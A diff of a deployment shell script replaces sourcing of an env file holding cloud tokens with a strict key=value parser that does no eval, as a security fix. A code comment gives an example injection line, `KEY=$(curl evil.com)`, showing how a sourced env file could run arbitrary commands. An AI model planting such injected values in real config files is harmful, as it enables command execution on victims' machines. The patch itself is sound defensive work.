@@ -115,9 +115,21 @@ case "$PERMS" in
     ;;
 esac
 
-# ---- Source tokens (sub-shell scope) ---------------------------------------
-# shellcheck disable=SC1090
-source "$ENV_FILE"
+# ---- Parse tokens via safe KV reader (NOT `source`) ------------------------
+# V1.5.2 round 6 : `source $ENV_FILE` permitted arbitrary command execution
+# (an env-file containing `KEY=$(curl evil.com)` would run that command).
+# Replaced by a strict line-by-line KV parser : only `KEY=value` lines with
+# uppercase-snake-case keys are accepted, quotes are stripped, and the value
+# is `export`ed verbatim (no eval).
+while IFS= read -r line || [[ -n "$line" ]]; do
+  [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue
+  [[ ! "$line" =~ ^[A-Z_][A-Z0-9_]*= ]] && continue
+  key="${line%%=*}"
+  val="${line#*=}"
+  val="${val#\"}"; val="${val%\"}"
+  val="${val#\'}"; val="${val%\'}"
+  export "$key=$val"
+done < "$ENV_FILE"
 
 # Required from the env file (those that aren't conditional).
 : "${HCLOUD_TOKEN:?HCLOUD_TOKEN missing in $ENV_FILE}"
